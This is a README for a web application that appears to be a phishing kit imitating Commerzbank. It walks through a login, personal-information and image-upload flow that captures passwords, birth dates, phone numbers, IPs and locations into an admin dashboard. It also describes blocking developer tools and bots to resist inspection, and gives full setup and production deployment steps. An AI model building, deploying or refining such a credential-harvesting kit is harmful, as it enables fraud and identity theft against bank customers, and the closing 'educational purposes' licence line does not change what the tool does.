# Commcomm Application

A comprehensive React.js application with PostgreSQL backend, featuring multi-step form processing, admin panel, and secure data collection with visitor tracking.

## Features

- **Multi-step form process**: Login → Information → Upload → Done
- **Admin Panel**: Real-time dashboard with user data, statistics, and visitor tracking
- **Security features**: Anti-bot protection, IP tracking, developer tools blocking
- **Form data collection**: Personal information, login credentials, file uploads
- **Database integration**: PostgreSQL with Prisma ORM
- **Session management**: Data persistence across pages with unique session IDs
- **File upload**: Image file upload with validation
- **Visitor tracking**: Page visit monitoring and analytics
- **Language support**: German/English language selector
- **Responsive design**: Mobile-friendly interface
- **Production ready**: Complete deployment setup for AMD64 systems


## Project Structure

```
Commcomm-main/
├── src/
│   ├── components/
│   │   ├── LoginPage.tsx      # Login form
│   │   ├── InfoPage.tsx       # Personal information form
│   │   ├── UploadPage.tsx     # File upload form
│   │   ├── DonePage.tsx       # Success page
│   │   ├── AdminPanel.tsx     # Admin dashboard
│   │   └── SecurityScript.tsx # Security and anti-bot features
│   ├── services/
│   │   └── api.ts            # API service layer
│   ├── App.tsx               # Main app component with routing
│   ├── App.css               # Styling
│   └── index.tsx             # Entry point
├── backend/
│   ├── server.js             # Express.js backend server
│   ├── database.js           # Database service with Prisma
│   ├── package.json          # Backend dependencies
│   ├── uploads/              # File upload directory
│   └── .env                  # Environment variables
├── prisma/
│   └── schema.prisma         # Database schema
├── deploy-amd.sh             # AMD deployment script
├── deployment-config.json    # Deployment configuration
├── DEPLOYMENT.md             # Deployment guide
└── package.json              # Frontend dependencies
```

## Setup Instructions

### Prerequisites

- **Node.js** (v16 or higher)
- **npm** or **yarn**
- **PostgreSQL** (v15 or higher)
- **Git**

### Quick Start (Development)

1. **Clone the repository:**
   ```bash
   git clone <repository-url>
   cd Commcomm-main
   ```

2. **Install frontend dependencies:**
   ```bash
   npm install
   ```

3. **Install backend dependencies:**
   ```bash
   cd backend
   npm install
   cd ..
   ```

4. **Setup PostgreSQL database:**
   ```bash
   # Create database
   createdb commcomm_db
   
   # Or using PostgreSQL client
   psql -c "CREATE DATABASE commcomm_db;"
   ```

5. **Configure environment variables:**
   ```bash
   # Create backend/.env file
   cp backend/.env.example backend/.env
   # Edit the .env file with your database credentials
   ```

6. **Setup database schema:**
   ```bash
   cd backend
   npx prisma generate
   npx prisma db push
   cd ..
   ```

7. **Start the application:**
   ```bash
   # Terminal 1 - Backend
   cd backend && npm start
   
   # Terminal 2 - Frontend
   npm start
   ```

- **Frontend**: `http://localhost:3000`
- **Backend API**: `http://localhost:3001`
- **Admin Panel**: `http://localhost:3000/admin`

### Production Build

To build the React app for production:

```bash
npm run build
```

## Environment Variables

### Backend Configuration (`backend/.env`)

```bash
# Database Configuration
DATABASE_URL="postgresql://username:password@localhost:5432/commcomm_db?schema=public"

# Server Configuration
NODE_ENV=production
PORT=3001

# Security Keys (CHANGE THESE IN PRODUCTION!)
JWT_SECRET="your-super-secret-jwt-key-change-this-in-production"
SESSION_SECRET="your-super-secret-session-key-change-this-in-production"

# File Upload Configuration
MAX_FILE_SIZE=10485760
UPLOAD_PATH="./uploads"

# Admin Panel Credentials (CHANGE THESE!)
ADMIN_USERNAME="admin"
ADMIN_PASSWORD="admin123"
```

### Frontend Configuration

Create a `.env` file in the root directory:

```bash
# API Configuration
REACT_APP_API_URL=http://localhost:3001/api

# For production, use your domain:
# REACT_APP_API_URL=https://your-domain.com/api
```

## API Endpoints

### Public Endpoints
- `POST /api/login` - Handle login form submission
- `POST /api/info` - Handle personal information submission
- `POST /api/upload` - Handle file upload
- `POST /api/final` - Handle final data submission
- `GET /api/health` - Health check endpoint

### Admin Endpoints (Protected)
- `POST /api/admin/login` - Admin authentication
- `GET /api/admin/user-data` - Retrieve all user sessions
- `GET /api/admin/stats` - Get application statistics
- `GET /api/admin/visitors` - Get visitor analytics
- `DELETE /api/admin/delete-data/:sessionId` - Delete specific session data

## Security Features

The application includes the same security features as the original PHP version:

- **Developer tools blocking**: Prevents F12, Ctrl+Shift+I, etc.
- **Right-click prevention**: Disables context menu
- **Text selection blocking**: Prevents text selection
- **Copy/paste prevention**: Blocks clipboard operations
- **Drag prevention**: Disables element dragging
- **Console protection**: Blocks developer console access

## Data Collection

The application collects the following data:

1. **Login credentials**: Username and password
2. **Personal information**: First name, last name, birth date, phone number
3. **File uploads**: Image files (JPG, PNG, GIF)
4. **System information**: IP address, user agent, timestamp
5. **Location data**: IP-based location (if available)

## Configuration

### Environment Variables

Create a `.env` file in the react-app directory:

```
REACT_APP_API_URL=http://localhost:3001/api
```

### Backend Configuration

The backend server can be configured by modifying the `server.js` file:

- Change the port by setting the `PORT` environment variable
- Modify file upload limits in the multer configuration
- Add additional security measures as needed

## Development

### Adding New Features

1. Create new components in the `src/components/` directory
2. Add new API endpoints in the backend `server.js`
3. Update the routing in `App.tsx` if needed
4. Add corresponding API methods in `src/services/api.ts`

### Styling

The application uses CSS modules and custom CSS. Main styles are in `App.css`. The styling maintains the Commerzbank brand appearance.

## Production Deployment

### AMD64 Deployment (Recommended)

For production deployment on AMD64 systems (Ubuntu 22.04 LTS):

1. **Run the automated deployment script:**
   ```bash
   chmod +x deploy-amd.sh
   ./deploy-amd.sh
   ```

2. **Manual deployment steps:**
   - Follow the detailed guide in `DEPLOYMENT.md`
   - Configure your domain name
   - Setup SSL certificates
   - Update admin credentials

### Manual Production Setup

1. **Build the frontend:**
   ```bash
   npm run build
   ```

2. **Setup production environment:**
   ```bash
   # Create production .env file
   cp backend/.env.example backend/.env
   # Update with production values
   ```

3. **Install production dependencies:**
   ```bash
   cd backend
   npm install --production
   ```

4. **Setup database:**
   ```bash
   npx prisma generate
   npx prisma db push
   ```

5. **Start with PM2:**
   ```bash
   npm install -g pm2
   pm2 start server.js --name commcomm-backend
   pm2 startup
   pm2 save
   ```

### Production Environment Variables

**IMPORTANT**: Change these default values in production:

```bash
# Database (use strong password)
DATABASE_URL="postgresql://commcomm_user:STRONG_PASSWORD@localhost:5432/commcomm_db"

# Security (generate strong secrets)
JWT_SECRET="generate-a-very-long-random-string-here"
SESSION_SECRET="generate-another-very-long-random-string-here"

# Admin credentials (change these!)
ADMIN_USERNAME="your_admin_username"
ADMIN_PASSWORD="your_strong_admin_password"
```

### Security Checklist

- [ ] Change default admin credentials
- [ ] Generate strong JWT and session secrets
- [ ] Use strong database password
- [ ] Enable SSL/HTTPS
- [ ] Configure firewall (UFW)
- [ ] Setup fail2ban
- [ ] Regular security updates
- [ ] Monitor logs
- [ ] Backup strategy

## Admin Panel

The application includes a comprehensive admin panel accessible at `/admin`:

### Features
- **Real-time dashboard** with statistics
- **User data management** with session tracking
- **Visitor analytics** and page visit monitoring
- **Data export** and deletion capabilities
- **Multi-language support** (German/English)
- **Auto-refresh** functionality
- **Responsive design** for mobile access

### Default Admin Credentials
```
Username: admin
Password: admin123
```

**⚠️ IMPORTANT**: Change these credentials immediately in production!

## Database Schema

The application uses PostgreSQL with the following main tables:

- **UserSession**: Main session tracking
- **LoginData**: User login credentials
- **InfoData**: Personal information
- **UploadData**: File upload records
- **FinalData**: Complete session data
- **Visitor**: Page visit tracking

## Monitoring and Logs

### Application Logs
```bash
# View application logs
sudo journalctl -u commcomm -f

# View Nginx logs
sudo tail -f /var/log/nginx/error.log
sudo tail -f /var/log/nginx/access.log

# View PostgreSQL logs
sudo tail -f /var/log/postgresql/postgresql-15-main.log
```

### Health Checks
```bash
# Check service status
sudo systemctl status commcomm postgresql nginx

# Test API endpoints
curl http://localhost:3001/api/health
curl http://localhost:3001/api/admin/stats
```

## Troubleshooting

### Common Issues

1. **Database connection errors**: Check PostgreSQL service and credentials
2. **File upload issues**: Verify upload directory permissions
3. **Admin panel access**: Ensure correct credentials and session
4. **SSL certificate problems**: Verify domain configuration and Let's Encrypt setup

### Support Files
- `DEPLOYMENT.md` - Detailed deployment guide
- `deployment-config.json` - Configuration reference
- `deploy-amd.sh` - Automated deployment script

## Security Notes

- All data is encrypted in transit (HTTPS)
- Session management with unique IDs
- IP tracking and visitor monitoring
- Anti-bot protection measures
- Secure file upload validation
- Admin panel authentication required

## License

This project is for educational and development purposes. Please ensure compliance with local laws and regulations regarding data collection and privacy.
